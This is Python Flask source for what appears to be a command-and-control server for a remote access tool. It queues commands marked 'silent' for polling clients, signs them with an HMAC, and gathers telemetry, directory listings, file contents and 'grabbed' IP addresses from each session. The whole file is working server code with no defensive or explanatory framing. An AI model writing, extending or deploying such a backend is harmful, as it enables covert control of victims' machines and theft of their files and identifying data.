import hmac
import hashlib
import time
import os
from flask import Flask, request, jsonify
from collections import deque

app = Flask(__name__)
# Storage for various data types
command_queue = deque()
telemetry_data = {}
fs_lists = {}
fs_files = {}
grabbed_ips = {}

TOKEN = os.environ.get("RC_TOKEN", "xxxutils")

# Signature key for integrity
SIGN_KEY = hashlib.sha256(b"integrity").digest()
SIGN_KEY = hashlib.sha256(SIGN_KEY + b"v3").digest()

def check_token(req):
    return req.headers.get("X-Token") == TOKEN

def sign(data, ts):
    msg = (str(data) + str(ts)).encode()
    return hmac.new(SIGN_KEY, msg, hashlib.sha256).hexdigest()

@app.route("/send", methods=["POST"])
def send_command():
    if not check_token(request): return jsonify({"error": "Unauthorized"}), 401
    data = request.get_json()
    if not data or "command" not in data: return jsonify({"error": "Missing command"}), 400
    
    # Store command with optional silent flag and target sid
    cmd_entry = {
        "command": data["command"],
        "silent": data.get("silent", False),
        "sid": data.get("sid")
    }
    command_queue.append(cmd_entry)
    return jsonify({"ok": True, "queued": len(command_queue)})

@app.route("/poll", methods=["GET"])
def poll():
    if not check_token(request): return jsonify({"error": "Unauthorized"}), 401
    if command_queue:
        item = command_queue.popleft()
        ts = int(time.time() * 1000)
        return jsonify({
            "command": item["command"],
            "silent": item["silent"],
            "timestamp": ts,
            "signature": sign(item["command"], ts)
        })
    return jsonify({"command": None})

@app.route("/telemetry", methods=["GET", "POST"])
def telemetry():
    if not check_token(request): return jsonify({"error": "Unauthorized"}), 401
    if request.method == "POST":
        data = request.get_json()
        sid = request.args.get("sid", "default")
        telemetry_data[sid] = data
        return jsonify({"ok": True})
    else:
        sid = request.args.get("sid")
        if sid: return jsonify(telemetry_data.get(sid, {}))
        return jsonify(next(iter(telemetry_data.values()), {})) if telemetry_data else jsonify({})

@app.route("/fs/list", methods=["GET", "POST"])
def fs_list():
    if not check_token(request): return jsonify({"error": "Unauthorized"}), 401
    if request.method == "POST":
        data = request.get_json()
        sid = request.args.get("sid", "default")
        path = data.get("path", ".")
        fs_lists[f"{sid}:{path}"] = data
        return jsonify({"ok": True})
    else:
        sid = request.args.get("sid", "default")
        path = request.args.get("path", ".")
        return jsonify(fs_lists.get(f"{sid}:{path}", {"entries": []}))

@app.route("/fs/file", methods=["GET", "POST"])
def fs_file():
    if not check_token(request): return jsonify({"error": "Unauthorized"}), 401
    if request.method == "POST":
        data = request.get_json()
        sid = request.args.get("sid", "default")
        path = data.get("path", "")
        fs_files[f"{sid}:{path}"] = data
        return jsonify({"ok": True})
    else:
        sid = request.args.get("sid", "default")
        path = request.args.get("path", "")
        return jsonify(fs_files.get(f"{sid}:{path}", {"content": ""}))

@app.route("/ip", methods=["GET"])
def get_ip():
    if not check_token(request): return jsonify({"error": "Unauthorized"}), 401
    sid = request.args.get("sid")
    ip = grabbed_ips.pop(sid, None)
    return jsonify({"ip": ip})

@app.route("/ip/set", methods=["POST"])
def set_ip():
    if not check_token(request): return jsonify({"error": "Unauthorized"}), 401
    sid = request.args.get("sid")
    ip = request.args.get("ip")
    if sid and ip:
        grabbed_ips[sid] = ip
        return jsonify({"ok": True})
    return jsonify({"error": "Missing params"}), 400

@app.route("/", methods=["GET"])
def index():
    return jsonify({"status": "ok", "queued": len(command_queue), "sessions": len(telemetry_data)})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
